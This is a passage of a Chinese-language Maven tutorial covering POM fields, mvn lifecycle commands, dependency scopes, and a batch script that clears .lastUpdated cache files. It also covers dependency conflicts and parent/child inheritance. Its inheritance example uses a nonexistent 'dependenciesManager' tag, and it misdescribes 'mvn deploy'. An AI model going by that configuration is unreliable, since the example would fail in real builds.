<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 模型版本 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--项目坐标：groupId,artifactId,version--&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 公司或者组织的唯一标志，并且配置时生成的路径也是由此生成， 如com.companyname.project-group，maven会将该项目打成的jar包放本地路径：/com/companyname/project-group --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.companyname.project-group<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 项目的唯一ID，一个groupId下面可能多个项目，就是靠artifactId来区分的 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>project<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 版本号 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--打包方式 jar(默认,普通java项目)、war(javaweb项目)、pom(父工程，不打包)--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">packaging</span>&gt;</span>jar/pom/war<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--包含内部属性和自定义属性，自定义的属性可以用$&#123;propertyName&#125;的格式在POM文件的其它地方引用。--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--依赖--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 引入具体的依赖包 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--依赖包的坐标、作用范围等信息--&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--其他可能的属性--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--指定当前项目所使用的 POM 模型版本--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h2 id="基于IDEA进行Maven工程构建"><a href="#基于IDEA进行Maven工程构建" class="headerlink" title="基于IDEA进行Maven工程构建"></a>基于IDEA进行Maven工程构建</h2><h3 id="构建概念和构建过程"><a href="#构建概念和构建过程" class="headerlink" title="构建概念和构建过程"></a>构建概念和构建过程</h3><p>项目构建是指将源代码、依赖库和资源文件等转换成可执行或可部署的应用程序的过程，在这个过程中包括编译源代码、链接依赖库、打包和部署等多个步骤。</p>
<p>项目构建是软件开发过程中至关重要的一部分，它能够大大提高软件开发效率，使得开发人员能够更加专注于应用程序的开发和维护，而不必关心应用程序的构建细节。</p>
<p>同时，项目构建还能够将多个开发人员的代码汇合到一起，并能够自动化项目的构建和部署，大大降低了项目的出错风险和提高开发效率。常见的构建工具包括 Maven、Gradle、Ant 等。</p>
<h3 id="使用命令构建项目"><a href="#使用命令构建项目" class="headerlink" title="使用命令构建项目"></a>使用命令构建项目</h3><table>
<thead>
<tr>
<th>命令</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>mvn compile</td>
<td>编译项目（不包括测试代码），生成target文件</td>
</tr>
<tr>
<td>mvn package</td>
<td>打包项目，生成jar或war文件</td>
</tr>
<tr>
<td>mvn clean</td>
<td>清理编译或打包后的项目结构</td>
</tr>
<tr>
<td>mvn install</td>
<td>打包后上传到maven本地仓库</td>
</tr>
<tr>
<td>mvn deploy</td>
<td>只打包，上传到maven私服仓库</td>
</tr>
<tr>
<td>mvn site</td>
<td>生成站点</td>
</tr>
<tr>
<td>mvn test-compile</td>
<td>编译所有测试代码</td>
</tr>
<tr>
<td>mvn test</td>
<td>执行所有测试源码</td>
</tr>
</tbody></table>
<p><strong>使用方法</strong><br>打开命令行工具(cmd,powershell等)，定位到POM.xml所在文件夹，即可开始执行命令。可以同时执行多条命令，<br>如：<code>mvn clean test</code></p>
<h4 id="编译和清理："><a href="#编译和清理：" class="headerlink" title="编译和清理："></a>编译和清理：</h4><p>使用<code>mvn compile</code>生成的target目录下存有生成的字节码文件等；<br><code>mvn clean</code>可以清除target目录</p>
<h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>需要先导入<code>junit.jupiter.api</code>包，方法见上文，<br>执行命令<code>mvn test-compile</code>编译所有测试方法，<br>然后再使用<code>mvn test</code>执行所有测试方法。</p>
<p><strong>要求：测试类和测试类中的测试方法必须以Test开头或结尾！</strong>，不能改变大小写，必须是<code>Test</code>，否则无法正确测试、无法生成报告。</p>
<p>测试报告可在<code>target/surefire-reports</code>下查看</p>
<h4 id="打包"><a href="#打包" class="headerlink" title="打包"></a>打包</h4><p><code>mvn package</code>：会自动编译所有的代码，包括核心代码和测试代码，然后执行测试代码，测试成功才执行打包操作，最终生成的.jar或.war中不会包含测试代码。最终命名如Maven_test-1.0-SNAPSHOT.jar</p>
<p>对JAVAWeb项目进行打包生成.war文件时必须使得war包打包插件和jdk版本匹配，具体处理方法如下：<br>在POM.xml中添加：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- jdk17 和 war包版本插件不匹配 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-war-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h4 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h4><p>使用其他Maven的项目对应.jar包：</p>
<ol>
<li>将被使用的项目的POM.xml文件中当前maven项目的坐标即groupId、artifactId、version三项配置复制到新项目，写在dependence标签下</li>
<li>将本地jar包安装到本地仓库：在被使用的项目所在文件夹下执行<code>mvn install</code></li>
</ol>
<p>在文件管理器中找到安装的本地或下载的插件对应的jar包，可以打开Maven本地仓库，以项目坐标为逐层目录和文件名即可。<br>如以下文件位于本地仓库目录下<code>\com\test\maven\Maven_test\1.0-SNAPSHOT</code>目录中</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.test.maven<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>Maven_test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>注意：打包（package）和安装（install）的区别：<br>打包是将工程打成jar或war文件，保存在target目录下<br>安装是将当前工程所生成的jar或war文件，安装到本地仓库，会按照坐标保存到指定位置</p>
<h3 id="可视化构建项目"><a href="#可视化构建项目" class="headerlink" title="可视化构建项目"></a>可视化构建项目</h3><p>右侧边栏maven-&gt;Lifecycle可进行上述所有命令行操作。</p>
<h3 id="构建插件、命令、生命周期命令之间的更新"><a href="#构建插件、命令、生命周期命令之间的更新" class="headerlink" title="构建插件、命令、生命周期命令之间的更新"></a>构建插件、命令、生命周期命令之间的更新</h3><p>构建生命周期可以理解成是一组固定构建命令的有序集合，触发周期后的命令，会自动触发周期前的命令！！！</p>
<p><strong>构建周期作用：会简化构建过程</strong><br>例如：项目打包使用命令<code>mvn clean package</code>即可。<br>在此过程主要两个构建生命周期：</p>
<ul>
<li>清理周期：主要是对项目编译生成文件进行清理。<br>对应clean命令</li>
<li>默认周期：定义了真正构件时所需要执行的所有步骤，它是生命周期中最核心的部分<br>对应命令：compile - test - package - install - deploy</li>
</ul>
<p><strong>插件、命令、周期三者关系（了解）</strong><br>Maven自身插件与命令一一对应，某生命周期→包含若干命令→包含若干插件。使用周期命令构建，简化构建过程！最终进行构建的是插件</p>
<h2 id="基于IDEA进行Maven依赖管理"><a href="#基于IDEA进行Maven依赖管理" class="headerlink" title="基于IDEA进行Maven依赖管理"></a>基于IDEA进行Maven依赖管理</h2><p><code>Maven</code>依赖管理是 <code>Maven</code>软件中最重要的功能之一。<code>Maven</code>的依赖管理能够帮助开发人员自动解决软件包依赖问题，使得开发人员能够轻松地将其他开发人员开发的模块或第三方框架集成到自己的应用程序或模块中，避免出现版本冲突和依赖缺失等问题。<br>我们通过定义 POM 文件，<code>Maven</code>能够自动解析项目的依赖关系，并通过 <code>Maven</code>仓库自动下载和管理依赖，从而避免了手动下载和管理依赖的繁琐工作和可能引发的版本冲突问题。</p>
<p><strong>Maven工程依赖管理配置</strong></p>
<p>依赖中的配置信息一般只(能)修改version属性，为方便修改，应当在properties属性下定义自定义属性，并在版本属性赋值时使用<code>$&#123;自定义属性名&#125;</code>，方便后期更换依赖版本</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--自定义属性，便于依赖版本管理--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">log4j_version</span>&gt;</span>1.2.17<span class="tag">&lt;/<span class="name">log4j_version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--通过编写依赖jar包的gav必要属性，引入第三方依赖；scope属性是可选的，可以指定依赖生效范围；</span></span><br><span class="line"><span class="comment">依赖信息查询方式：1. maven仓库信息官网 https://mvnrepository.com/；2. mavensearch插件搜索--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 引入具体的依赖包 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;log4j_version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 依赖范围 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="Scope依赖范围"><a href="#Scope依赖范围" class="headerlink" title="Scope依赖范围"></a>Scope依赖范围</h3><p>通过设置坐标的依赖范围(scope)，可以设置 对应jar包的作用范围：编译环境、测试环境、运行环境<br>默认采用<strong>compile</strong>，表示编译、测试、运行过程中此依赖均为必须。<br>可选的还有<strong>test</strong>(仅测试可用)、<strong>provided</strong>(仅编译测试可用,因为是Maven服务器提供的)、runtime(仅测试运行可用)、system、import<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240812231521.png" alt=" Scope依赖范围"></p>
<h3 id="Maven依赖下载失败的解决办法"><a href="#Maven依赖下载失败的解决办法" class="headerlink" title="Maven依赖下载失败的解决办法"></a>Maven依赖下载失败的解决办法</h3><p>下载失败可能的原因：</p>
<ol>
<li>下载依赖时出现网络故障或仓库服务器宕机等原因，导致无法连接至Maven仓库，从而无法下载依赖。</li>
<li>依赖项的版本号或配置文件中的版本号错误，或者依赖项没有正确定义，导致Maven下载的依赖项与实际需要的不一致，从而引发错误。&#x3D;&#x3D;》网站查不到的版本不要使用、不要自己修改坐标</li>
<li>本地Maven仓库或缓存被污染或损坏，导致Maven无法正确地使用现有的依赖项</li>
</ol>
<p>解决方案：</p>
<ol>
<li>检查网络连接和Maven仓库服务器状态。</li>
<li>确保依赖项的版本号与项目对应的版本号匹配，并检查POM文件中的依赖项是否正确。</li>
<li><strong>清除本地Maven仓库缓存（.lastUpdated文件）</strong>，因为只要存在lastUpdated缓存文件，刷新也不会重新下载。本地仓库中，根据依赖的gav属性依次向下查找文件夹，最终删除内部的文件，刷新重新下载即可！</li>
</ol>
<p><strong>脚本批量删除缓存文件</strong></p>
<p>创建.bat脚本文件，内容如下：</p>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cls</span></span><br><span class="line">@<span class="built_in">ECHO</span> OFF</span><br><span class="line"><span class="built_in">SET</span> CLEAR_PATH=D:</span><br><span class="line"><span class="built_in">SET</span> CLEAR_DIR=D:\maven-repository(修改为本地仓库路径)</span><br><span class="line"><span class="built_in">color</span> <span class="number">0</span>a</span><br><span class="line"><span class="built_in">TITLE</span> ClearLastUpdated <span class="keyword">For</span> Windows</span><br><span class="line"><span class="keyword">GOTO</span> MENU</span><br><span class="line">:MENU</span><br><span class="line"><span class="built_in">CLS</span></span><br><span class="line"><span class="built_in">ECHO</span>.</span><br><span class="line"><span class="built_in">ECHO</span>. * * * * ClearLastUpdated <span class="keyword">For</span> Windows * * * *</span><br><span class="line"><span class="built_in">ECHO</span>. * *</span><br><span class="line"><span class="built_in">ECHO</span>. * <span class="number">1</span> 清理*.lastUpdated *</span><br><span class="line"><span class="built_in">ECHO</span>. * *</span><br><span class="line"><span class="built_in">ECHO</span>. * <span class="number">2</span> 查看*.lastUpdated *</span><br><span class="line"><span class="built_in">ECHO</span>. * *</span><br><span class="line"><span class="built_in">ECHO</span>. * <span class="number">3</span> 退 出 *</span><br><span class="line"><span class="built_in">ECHO</span>. * *</span><br><span class="line"><span class="built_in">ECHO</span>. * * * * * * * * * * * * * * * * * * * * * * * *</span><br><span class="line"><span class="built_in">ECHO</span>.</span><br><span class="line"><span class="built_in">ECHO</span>.请输入选择项目的序号：</span><br><span class="line"><span class="built_in">set</span> /p ID=</span><br><span class="line"><span class="keyword">IF</span> &quot;<span class="variable">%id%</span>&quot;==&quot;<span class="number">1</span>&quot; <span class="keyword">GOTO</span> cmd1</span><br><span class="line"><span class="keyword">IF</span> &quot;<span class="variable">%id%</span>&quot;==&quot;<span class="number">2</span>&quot; <span class="keyword">GOTO</span> cmd2</span><br><span class="line"><span class="keyword">IF</span> &quot;<span class="variable">%id%</span>&quot;==&quot;<span class="number">3</span>&quot; <span class="keyword">EXIT</span></span><br><span class="line"><span class="built_in">PAUSE</span></span><br><span class="line">:cmd1</span><br><span class="line"><span class="built_in">ECHO</span>. 开始清理</span><br><span class="line"><span class="variable">%CLEAR_PATH%</span></span><br><span class="line"><span class="built_in">cd</span> <span class="variable">%CLEAR_DIR%</span></span><br><span class="line"><span class="keyword">for</span> /r <span class="variable">%%i</span> <span class="keyword">in</span> (*.lastUpdated) <span class="keyword">do</span> <span class="built_in">del</span> <span class="variable">%%i</span></span><br><span class="line"><span class="built_in">ECHO</span>.OK</span><br><span class="line"><span class="built_in">PAUSE</span></span><br><span class="line"><span class="keyword">GOTO</span> MENU</span><br><span class="line">:cmd2</span><br><span class="line"><span class="built_in">ECHO</span>. 查看*.lastUpdated文件</span><br><span class="line"><span class="variable">%CLEAR_PATH%</span></span><br><span class="line"><span class="built_in">cd</span> <span class="variable">%CLEAR_DIR%</span></span><br><span class="line"><span class="keyword">for</span> /r <span class="variable">%%i</span> <span class="keyword">in</span> (*.lastUpdated) <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">%%i</span></span><br><span class="line"><span class="built_in">ECHO</span>.OK</span><br><span class="line"><span class="built_in">PAUSE</span></span><br><span class="line"><span class="keyword">GOTO</span> MENU</span><br></pre></td></tr></table></figure>


<h3 id="POM配置文件Build构建配置"><a href="#POM配置文件Build构建配置" class="headerlink" title="POM配置文件Build构建配置"></a>POM配置文件Build构建配置</h3><p>项目构建是指将源代码、依赖库和资源文件等转换成可执行或可部署的应用程序的过程，在这个过程中包括编译源代码、链接依赖库、打包和部署等多个步骤。默认情况下，构建不需要额外配置，都有对应的缺省配置。也可以在pom.xml定制一些配置，来修改默认构建的行为和产物！<br>如：</p>
<ol>
<li>指定构建打包文件的名称，非默认名称<ul>
<li>默认的打包名称：artifactId+version.打包方式</li>
</ul>
</li>
<li>制定构建打包时，指定包含文件格式和排除文件<ul>
<li>默认情况下，按照maven工程结构放置的文件会默认被编译和打包，而没有按工程结构放置的文件如放在src&#x2F;main&#x2F;java下的MyBatis中有时会将用于编写SQL语句的映射文件就不会被打包</li>
<li>可以使用resources标签，指定要打包资源的文件夹要把哪些静态资源打包到classes根目录下！</li>
</ul>
</li>
<li>打包插件版本过低，配置更高版本插件<ul>
<li>dependencies标签下引入开发需要的jar包！我们可以在build&#x2F;plugins&#x2F;plugin标签引入插件</li>
<li>常用的插件：修改jdk版本、tomcat插件、MyBatis分页插件、MyBatis逆向工程插件等等</li>
</ul>
</li>
</ol>
<p>构建配置是在pom.xml&#x2F;build标签中指定！</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--1. 自定义打包的名称--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">finalName</span>&gt;</span>定义打包名称<span class="tag">&lt;/<span class="name">finalName</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--2. 设置要打包的资源位置--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--应用于配置文件没有写在resources目录下的情况--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--设置资源所在目录--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/java<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--设置包含的资源类型--&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--配置更高版本打包插件--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- java编译插件，配jdk的编译版本 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">encoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">encoding</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h2 id="Maven依赖传递和依赖冲突"><a href="#Maven依赖传递和依赖冲突" class="headerlink" title="Maven依赖传递和依赖冲突"></a>Maven依赖传递和依赖冲突</h2><h3 id="Maven依赖传递"><a href="#Maven依赖传递" class="headerlink" title="Maven依赖传递"></a>Maven依赖传递</h3><p>假如有Maven项目A，项目B依赖A，项目C依赖B。那么我们可以说 C依赖A。也就是说，依赖的关系为：C—&gt;B—&gt;A， 那么我们执行项目C时，会自动把B、A都下载导入到C项目的jar包文件夹中，这就是依赖的传递性。</p>
<p><strong>作用</strong></p>
<ul>
<li>简化依赖导入过程</li>
<li>确保依赖版本正确</li>
</ul>
<p><strong>传递的原则</strong>：在 A 依赖 B，B 依赖 C 的前提下，C 是否能够传递到 A，取决于 B 依赖 C 时使用的依赖范围以及配置</p>
<ul>
<li>B 依赖 C 时使用 compile 范围：可以传递</li>
<li>B 依赖 C 时使用 test 或 provided 范围：不能传递，所以需要这样的 jar 包时，就必须在需要的地方明确配置依赖才可以。</li>
<li>B 依赖 C 时，若配置了<code>&lt;optional&gt;true&lt;/optional&gt;</code>标签，则不能传递</li>
</ul>
<p><strong>不建议改变插件原有的作用范围来传递依赖，本项目需要的依赖不能传递的直接重新添加</strong></p>
<h3 id="Maven依赖冲突"><a href="#Maven依赖冲突" class="headerlink" title="Maven依赖冲突"></a>Maven依赖冲突</h3><p>当直接引用或者间接引用出现了相同的jar包，就会依赖冲突，<br>如：有Maven项目A，项目B依赖A，项目C依赖A、B，但C也有B传递的对A的依赖，那么就会出现依赖冲突。</p>
<p><strong>解决依赖冲突（如何选择重复依赖）方式：</strong></p>
<ol>
<li>自动选择原则：短路优先、先声明优先<ol>
<li>短路优先原则（第一原则）<br> A—&gt;B—&gt;C—&gt;D—&gt;E—&gt;X(version 0.0.1)<br> A—&gt;F—&gt;X(version 0.0.2)<br> 则A依赖于X(version 0.0.2)。</li>
<li>依赖路径长度相同情况下，则”先声明优先”（第二原则）<br> A—&gt;E—&gt;X(version 0.0.1)<br> A—&gt;F—&gt;X(version 0.0.2)<br> 在<code>&lt;depencies&gt;&lt;/depencies&gt;</code>中，先声明的，路径相同，会优先选择！</li>
</ol>
</li>
<li>手动排除<br>以章节例子，在当前项目C的POM文件中中想要排除的依赖所在的项目（如B）对应dependency标签下添加<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 使用excludes标签配置依赖的排除 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 在exclude标签中配置一个具体的排除 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 指定要排除的依赖的坐标（不需要写version） --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="Maven工程的继承和聚合关系"><a href="#Maven工程的继承和聚合关系" class="headerlink" title="Maven工程的继承和聚合关系"></a>Maven工程的继承和聚合关系</h2><h3 id="Maven工程继承关系"><a href="#Maven工程继承关系" class="headerlink" title="Maven工程继承关系"></a>Maven工程继承关系</h3><p>Maven 继承是指在Maven的项目中，让一个项目从另一个项目中继承配置信息的机制。继承可以让我们在多个项目中共享同一配置信息，在父工程中统一管理项目中的依赖信息，简化项目的管理和维护工作。</p>
<p>当对一个比较大型的项目进行了模块拆分后，一个project下面，创建了很多个module，每一个module都需要配置自己的依赖信息。<br><strong>继承解决的问题</strong>：</p>
<ul>
<li>在每一个 module 中各自维护各自的依赖信息很容易发生出入，不易统一管理。</li>
<li>使用同一个框架内的不同jar包，它们应该是同一个版本，所以整个项目中使用的框架版本需要统一。</li>
<li>使用框架时所需要的jar包组合（或者说依赖信息组合）需要经过长期摸索和反复调试，最终确定一个可用组合。这个耗费很大精力总结出来的方案不应该在新的项目中重新摸索。 通过在父工程中为整个项目维护依赖信息的组合既保证了整个项目使用规范、准确的jar包；又能够将以往的经验沉淀下来，节约时间和精力。</li>
</ul>
<p><strong>继承语法</strong></p>
<ol>
<li>父工程:<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 当前工程作为父工程，它要去管理子工程，所以打包方式必须是 pom --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">packaging</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>子工程:<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 使用parent标签指定当前工程的父工程 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 父工程的坐标 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.atguigu.maven<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>pro03-maven-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">   </span><br><span class="line"><span class="comment">&lt;!-- 子工程的坐标 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 如果子工程坐标中的groupId和version与父工程一致，可以省略 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>pro04-maven-module<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>注意事项:<ol>
<li>父工程的src文件夹最好删除</li>
<li>packaging标签下打包方式应当为pom(创建子过程后idea会自动更改)</li>
<li>父工程的依赖无条件继承给子工程，与依赖范围无关，为使子过程能部分继承依赖，想要使用dependenciesManager标签，具体参见下文</li>
<li>子工程的GroupId、version必须和父工程一致(idea会自动同步)</li>
<li><strong>子工程模块必须在父工程模块下创建</strong></li>
</ol>
</li>
</ol>
<h3 id="子工程部分继承父工程依赖：dependenciesManager"><a href="#子工程部分继承父工程依赖：dependenciesManager" class="headerlink" title="子工程部分继承父工程依赖：dependenciesManager"></a>子工程部分继承父工程依赖：dependenciesManager</h3><p>父工程将依赖标明在dependenciesManager标签下，不标在dependenciesManager下而标在dependencies下的直接无条件被继承：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependenciesManager</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--groupId,artifactId,version,scope等--&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependenciesManager</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">   <span class="comment">&lt;!-- .... --&gt;</span>    </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>子工程在dependencies中标明想要继承的父工程的dependenciesManager中的依赖，不需要写version</p>
